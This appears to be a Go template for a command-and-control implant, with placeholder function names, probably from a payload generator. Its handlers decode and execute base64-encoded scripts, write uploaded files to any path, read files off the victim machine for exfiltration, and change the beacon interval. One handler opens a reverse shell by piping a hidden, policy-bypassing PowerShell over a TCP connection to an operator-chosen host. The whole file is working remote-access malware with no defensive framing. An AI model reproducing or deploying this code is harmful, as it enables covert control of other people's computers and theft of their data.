// Additional command handlers
func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_MODULE_FUNC}(encodedScript string) string {
	decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to decode module: %v", err)
	}

	return a.{AGENT_EXECUTE_FUNC}(string(decodedScript))
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_UPLOAD_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3)
	if len(parts) != 3 {
		return "[ERROR] Invalid upload command format."
	}

	remotePath := parts[1]
	encodedData := parts[2]

	decodedData, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to decode file content: %v", err)
	}

	err = ioutil.WriteFile(remotePath, decodedData, 0644)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to write file: %v", err)
	}

	return fmt.Sprintf("[SUCCESS] File uploaded to %s", remotePath)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOWNLOAD_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		return "[ERROR] Invalid download command format."
	}

	remotePath := parts[1]

	if _, err := os.Stat(remotePath); os.IsNotExist(err) {
		return fmt.Sprintf("[ERROR] File not found on remote machine: %s", remotePath)
	}

	fileContent, err := ioutil.ReadFile(remotePath)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to read file: %v", err)
	}

	encodedContent := base64.StdEncoding.EncodeToString(fileContent)
	return encodedContent
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_TTY_SHELL_FUNC}(command string) string {
	parts := strings.Split(command, " ")
	var host string
	var port string

	if len(parts) >= 3 {
		host = parts[1]
		port = parts[2]
	} else {
		host = "127.0.0.1"
		port = "5000"
	}

	go func() {
		address := fmt.Sprintf("%s:%s", host, port)

		conn, err := net.Dial("tcp", address)
		if err != nil {
			return
		}
		defer conn.Close()

		// Only support PowerShell on Windows
		cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "-")

		stdin, err := cmd.StdinPipe()
		if err != nil {
			return
		}
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return
		}
		stderr, err := cmd.StderrPipe()
		if err != nil {
			return
		}

		if err := cmd.Start(); err != nil {
			return
		}

		go func() {
			_, _ = io.Copy(conn, stdout)
		}()

		go func() {
			_, _ = io.Copy(conn, stderr)
		}()

		go func() {
			_, _ = io.Copy(stdin, conn)
		}()

		cmd.Wait()
	}()

	return fmt.Sprintf("[SUCCESS] TTY shell connection initiated to %s:%s", host, port)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_SLEEP_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		return "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
	}

	newSleep, err := strconv.Atoi(parts[1])
	if err != nil {
		return "[ERROR] Sleep interval must be a valid integer"
	}

	if newSleep <= 0 {
		return "[ERROR] Sleep interval must be a positive integer"
	}

	a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = newSleep
	return fmt.Sprintf("[SUCCESS] Sleep interval changed to %d seconds", newSleep)
}